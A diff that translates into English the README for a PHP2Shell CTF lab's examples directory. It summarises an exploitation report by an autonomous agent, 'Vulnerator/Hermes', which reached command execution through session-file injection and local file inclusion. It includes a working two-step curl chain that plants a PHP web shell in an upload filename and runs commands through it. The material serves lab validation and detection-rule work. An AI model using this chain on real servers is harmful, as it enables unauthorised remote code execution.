@@ -1,112 +1,112 @@
-# Ejemplos de explotación — PHP2Shell Lab
+# Exploitation examples — PHP2Shell Lab
 
-Este directorio contiene **informes reales** de explotaciones exitosas ejecutadas por Vulnerator contra el lab, como ejemplos de referencia y validación de que las cadenas de ataque son reproducibles.
+This directory contains **real reports** of successful exploits run by Vulnerator against the lab, as reference examples and validation that the attack chains are reproducible.
 
 ---
 
 ## `chain-a-exploitation-report.md`
 
 **Engagement:** `ctf-php2shell-chainA`  
-**Fecha:** 21 octubre 2026  
-**Atacante:** Vulnerator/Hermes (agente OODA autónomo)  
-**Resultado:** ✅ **RCE CONFIRMADO** — ejecución arbitraria de comandos como `www-data` (uid=33)
+**Date:** 21 October 2026
+**Attacker:** Vulnerator/Hermes (autonomous OODA agent)
+**Result:** ✅ **RCE CONFIRMED** — arbitrary command execution as `www-data` (uid=33)
 
-### Resumen
+### Summary
 
-Explotación completa de **Chain A** (Session File Injection + LFI → RCE):
+Full exploitation of **Chain A** (Session File Injection + LFI → RCE):
 
-1. **Session fixation:** SID controlado `ctfchainA00000000000000000000000`
-2. **Inyección:** POST multipart con payload PHP en el `filename` del upload
-3. **Persistencia:** fichero de sesión con código PHP crudo (gracias a `cleanup=Off`)
-4. **Ejecución:** LFI en `/vuln.php?page=/tmp/sessions/sess_<SID>` → include del fichero → RCE
+1. **Session fixation:** controlled SID `ctfchainA00000000000000000000000`
+2. **Injection:** multipart POST with a PHP payload in the upload `filename`
+3. **Persistence:** session file with raw PHP code (thanks to `cleanup=Off`)
+4. **Execution:** LFI at `/vuln.php?page=/tmp/sessions/sess_<SID>` → file include → RCE
 
-### Comandos ejecutados
+### Commands executed
 
 ```bash
-# Prueba de concepto
+# Proof of concept
 GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id
 → uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-# Otros comandos de demostración
+# Other demonstration commands
 whoami          → www-data
 uname -a        → Linux 7.0.12-linuxkit aarch64 GNU/Linux
 head -3 /etc/os-release → Debian GNU/Linux 13 (trixie)
 ```
 
-### Target comprometido
+### Compromised target
 
 - **PHP:** 8.2.34 (vulnerable, < 8.2.35)
 - **SAPI:** fpm-fcgi
-- **Servidor:** nginx/1.31.7
-- **Usuario proceso:** www-data (uid=33)
+- **Server:** nginx/1.31.7
+- **Process user:** www-data (uid=33)
 
-### Evidencia
+### Evidence
 
-El informe completo incluye:
-- Peticiones HTTP completas (POST multipart + GET LFI)
-- Respuestas del servidor con stack traces
-- Salida verbatim de comandos ejecutados
-- 7 hallazgos confirmados con mapeo MITRE ATT&CK
-- Validación de alcance (todo tráfico a `host.docker.internal:18080`)
-
----
-
-## Cómo usar estos ejemplos
-
-### 1. Como validación del lab
-
-Los informes demuestran que el lab está correctamente configurado y las chains son reproducibles. Si montas el lab y no consigues RCE, compara tu setup con los detalles del informe (versión PHP, config `upload_progress`, endpoints).
-
-### 2. Como plantilla para tus propios engagements
-
-El formato del informe (`REPORT.md`) es el output estándar de Vulnerator. Puedes usarlo como referencia para:
-- Estructurar tus propios informes de pentesting
-- Ver qué evidencia recopiló el agente (peticiones, respuestas, comandos)
-- Entender el flujo OODA (Observe → Orient → Decide → Act)
-
-### 3. Como PoC para desarrollo de detecciones
-
-Si estás desarrollando reglas de detección (SIEM, IDS/IPS, WAF), el informe documenta:
-- Patrones de peticiones HTTP (multipart con payload en filename)
-- Indicadores de LFI (paths como `/tmp/sessions/sess_<SID>`)
-- Comportamiento post-explotación (comandos de recon típicos: `id`, `whoami`, `uname`)
+The full report includes:
+- Full HTTP requests (POST multipart + GET LFI)
+- Server responses with stack traces
+- Verbatim output of executed commands
+- 7 confirmed findings with MITRE ATT&CK mapping
+- Scope validation (all traffic to `host.docker.internal:18080`)
 
 ---
 
-## Reproducir la explotación manualmente
+## How to use these examples
 
-Si quieres replicar Chain A sin Vulnerator, sigue la guía en [`../TESTING.md`](../TESTING.md), sección "Test 1: Chain A". El script Python incluido reproduce exactamente los pasos del informe.
+### 1. As lab validation
 
-Alternativamente, usa curl:
+The reports demonstrate that the lab is correctly configured and the chains are reproducible. If you set up the lab and cannot achieve RCE, compare your setup with the report details (PHP version, `upload_progress` config, endpoints).
+
+### 2. As a template for your own engagements
+
+The report format (`REPORT.md`) is Vulnerator's standard output. You can use it as a reference to:
+- Structure your own pentest reports
+- See what evidence the agent collected (requests, responses, commands)
+- Understand the OODA flow (Observe → Orient → Decide → Act)
+
+### 3. As a PoC for detection development
+
+If you are developing detection rules (SIEM, IDS/IPS, WAF), the report documents:
+- HTTP request patterns (multipart with a payload in the filename)
+- LFI indicators (paths such as `/tmp/sessions/sess_<SID>`)
+- Post-exploitation behavior (typical recon commands: `id`, `whoami`, `uname`)
+
+---
+
+## Reproduce the exploitation manually
+
+If you want to replicate Chain A without Vulnerator, follow the guide in [`../TESTING.md`](../TESTING.md), section "Test 1: Chain A". The included Python script reproduces the report steps exactly.
+
+Alternatively, use curl:
 
 ```bash
 SID="mytest000000000000000000000000"
 
-# Paso 1: Inyectar payload
+# Step 1: Inject the payload
 curl -X POST http://127.0.0.1:18080/index.php \
   -H "Cookie: PHPSESSID=$SID" \
   -F "PHPSESSID=$SID" \
   -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
   -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"
 
-# Paso 2: Ejecutar comando vía LFI
+# Step 2: Execute a command via LFI
 curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
 ```
 
 ---
 
-## Añadir más ejemplos
+## Adding more examples
 
-Si ejecutas otros engagements (Chain C, Chain D, etc.) y quieres documentarlos:
+If you run other engagements (Chain C, Chain D, etc.) and want to document them:
 
-1. Descarga el informe desde el contenedor Kali:
+1. Download the report from the Kali container:
    ```bash
    docker cp vulnerator-ai-kali-1:/artifacts/<engagement-id>/REPORT.md \
      labs/php2shell-lab/examples/<nombre-descriptivo>.md
    ```
 
-2. Actualiza este `README.md` con entrada para el nuevo ejemplo.
+2. Update this `README.md` with an entry for the new example.
 
 ---
 
-**Estos informes son resultado de testing en entorno CTF local autorizado. No contienen datos sensibles reales.**
+**These reports are the result of testing in an authorized local CTF environment. They contain no real sensitive data.**
